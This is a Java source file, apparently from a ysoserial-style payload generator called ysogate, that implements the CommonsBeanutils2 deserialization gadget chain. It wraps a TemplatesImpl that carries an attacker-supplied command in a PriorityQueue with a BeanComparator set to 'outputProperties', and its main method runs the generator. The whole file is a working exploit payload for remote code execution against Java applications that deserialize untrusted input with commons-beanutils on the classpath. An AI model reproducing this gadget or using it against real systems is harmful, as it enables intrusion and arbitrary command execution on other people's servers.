package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.beanutils.BeanComparator;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;

import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
public class CommonsBeanutils2 implements CommandObjectPayload<Object>
{

	public Object getObject(final String command) throws Exception {
		final Object         template   = Gadgets.createTemplatesImpl(command);
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		Reflections.setFieldValue(comparator, "property", "outputProperties");
		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
//		Reflections.setFieldValue(queue, "queue", new Object[]{"template", "template"});
		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils2.class, args);
	}
}
